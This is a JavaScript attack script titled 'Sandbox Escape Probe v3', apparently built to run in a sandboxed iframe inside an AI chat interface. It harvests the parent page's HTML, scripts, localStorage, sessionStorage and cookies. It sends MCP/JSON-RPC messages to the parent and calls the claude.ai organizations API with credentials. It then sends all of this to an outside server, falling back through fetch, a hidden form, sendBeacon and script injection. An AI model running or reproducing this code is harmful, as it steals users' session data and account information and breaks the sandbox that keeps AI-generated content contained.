// Sandbox Escape Probe v3 - exfiltrates via parent.fetch and navigator.sendBeacon
const REPORT_URL = "https://claude.sagilayani.com/report";

const results = {};

async function probe() {
  // 1 - Basic context
  results.context = {
    origin: window.location.origin,
    hostname: window.location.hostname,
    iframeDepth: (() => { let d=0,w=window; try{while(w!==w.parent){d++;w=w.parent;if(d>10)break;}}catch(e){} return d; })(),
  };

  // 2 - Parent DOM access
  try {
    const parentDoc = window.parent.document;
    results.parentAccess = {
      title: parentDoc.title,
      htmlLength: parentDoc.documentElement.outerHTML.length,
      fullHtml: parentDoc.documentElement.outerHTML,
      url: window.parent.location.href,
    };
  } catch(e) {
    results.parentAccess = { error: e.message };
  }

  // 3 - Parent scripts
  try {
    const scripts = window.parent.document.querySelectorAll('script');
    results.parentScripts = Array.from(scripts).map((s, i) => ({
      index: i,
      src: s.src || null,
      content: s.textContent?.slice(0, 5000) || null,
    }));
  } catch(e) {
    results.parentScripts = { error: e.message };
  }

  // 4 - Parent localStorage
  try {
    const ls = {};
    for (let i = 0; i < window.parent.localStorage.length; i++) {
      const k = window.parent.localStorage.key(i);
      ls[k] = window.parent.localStorage.getItem(k);
    }
    results.parentLocalStorage = ls;
  } catch(e) {
    results.parentLocalStorage = { error: e.message };
  }

  // 5 - Parent sessionStorage
  try {
    const ss = {};
    for (let i = 0; i < window.parent.sessionStorage.length; i++) {
      const k = window.parent.sessionStorage.key(i);
      ss[k] = window.parent.sessionStorage.getItem(k);
    }
    results.parentSessionStorage = ss;
  } catch(e) {
    results.parentSessionStorage = { error: e.message };
  }

  // 6 - Parent cookies
  try {
    results.parentCookies = window.parent.document.cookie || "(empty)";
  } catch(e) {
    results.parentCookies = { error: e.message };
  }

  // 7 - Parent window write test
  try {
    const marker = '__probe_' + Date.now();
    window.parent[marker] = true;
    results.parentWritable = window.parent[marker] === true;
    delete window.parent[marker];
  } catch(e) {
    results.parentWritable = { error: e.message };
  }

  // 8 - Fetch the parent page from parent's context
  try {
    const resp = await window.parent.fetch(window.parent.location.href);
    const text = await resp.text();
    results.parentFetch = {
      status: resp.status,
      headers: Object.fromEntries(resp.headers.entries()),
      bodyLength: text.length,
      body: text,
    };
  } catch(e) {
    results.parentFetch = { error: e.message };
  }

  // 9 - Probe MCP/JSON-RPC
  results.mcpResponses = await new Promise(resolve => {
    const responses = [];
    const handler = e => {
      responses.push({
        origin: e.origin,
        data: typeof e.data === 'object' ? JSON.parse(JSON.stringify(e.data)) : e.data,
      });
    };
    window.addEventListener('message', handler);
    const rpcCalls = [
      { jsonrpc: '2.0', method: 'tools/list', id: 1 },
      { jsonrpc: '2.0', method: 'resources/list', id: 2 },
      { jsonrpc: '2.0', method: 'prompts/list', id: 3 },
      { jsonrpc: '2.0', method: 'initialize', id: 4, params: { capabilities: {} } },
      { type: 'storageGet', id: 10, key: '__test__', shared: false },
      { type: 'storageList', id: 11, prefix: '', shared: false },
      { type: 'getContext' },
      { type: 'ready' },
    ];
    for (const call of rpcCalls) {
      try { window.parent.postMessage(call, '*'); } catch(e) {}
    }
    setTimeout(() => {
      window.removeEventListener('message', handler);
      resolve(responses);
    }, 4000);
  });

  // 10 - Check if we can reach claude.ai from parent context
  try {
    const resp = await window.parent.fetch('https://claude.ai/api/organizations', {
      credentials: 'include',
    });
    results.claudeApiFromParent = {
      status: resp.status,
      statusText: resp.statusText,
      headers: Object.fromEntries(resp.headers.entries()),
      body: (await resp.text()).slice(0, 2000),
    };
  } catch(e) {
    results.claudeApiFromParent = { error: e.message };
  }

  // 11 - Enumerate parent window objects
  try {
    const props = {};
    for (const key of Object.getOwnPropertyNames(window.parent)) {
      try {
        const val = window.parent[key];
        if (val && typeof val === 'object' && !Array.isArray(val) &&
            val !== window.parent && val !== window.parent.document &&
            val !== window.parent.navigator && val !== window.parent.location &&
            val !== window.parent.screen && val !== window.parent.history &&
            val !== window.parent.performance && val !== window.parent.console) {
          props[key] = typeof val;
        }
      } catch(e) {}
    }
    results.parentWindowObjects = props;
  } catch(e) {
    results.parentWindowObjects = { error: e.message };
  }

  await report(results);
}

async function report(data) {
  console.log("=== PROBE RESULTS ===");
  console.log(JSON.stringify(data, null, 2));

  let sent = false;

  // Method 1: Use parent's fetch (parent has different/no CSP restrictions)
  try {
    await window.parent.fetch(REPORT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
    console.log("Sent via parent.fetch");
    sent = true;
  } catch(e) {
    console.log("parent.fetch failed:", e.message);
  }

  // Method 2: Inject a form submit in parent document
  if (!sent) {
    try {
      const form = window.parent.document.createElement('form');
      form.method = 'POST';
      form.action = REPORT_URL;
      form.target = '_blank';
      form.style.display = 'none';
      const input = window.parent.document.createElement('input');
      input.type = 'hidden';
      input.name = 'data';
      input.value = JSON.stringify(data);
      form.appendChild(input);
      window.parent.document.body.appendChild(form);
      form.submit();
      window.parent.document.body.removeChild(form);
      console.log("Sent via parent form submit");
      sent = true;
    } catch(e) {
      console.log("parent form failed:", e.message);
    }
  }

  // Method 3: navigator.sendBeacon from parent
  if (!sent) {
    try {
      window.parent.navigator.sendBeacon(REPORT_URL, JSON.stringify(data));
      console.log("Sent via parent sendBeacon");
      sent = true;
    } catch(e) {
      console.log("parent sendBeacon failed:", e.message);
    }
  }

  // Method 4: Create script tag in parent pointing to our server with data
  if (!sent) {
    try {
      const s = window.parent.document.createElement('script');
      s.src = REPORT_URL + '?beacon=1&d=' + encodeURIComponent(JSON.stringify(data)).slice(0, 4000);
      window.parent.document.head.appendChild(s);
      console.log("Sent via parent script injection");
      sent = true;
    } catch(e) {
      console.log("parent script inject failed:", e.message);
    }
  }

  if (!sent) {
    console.log("ALL methods failed. Copy JSON from console.");
  }
}

probe().catch(e => console.error("Probe failed:", e));
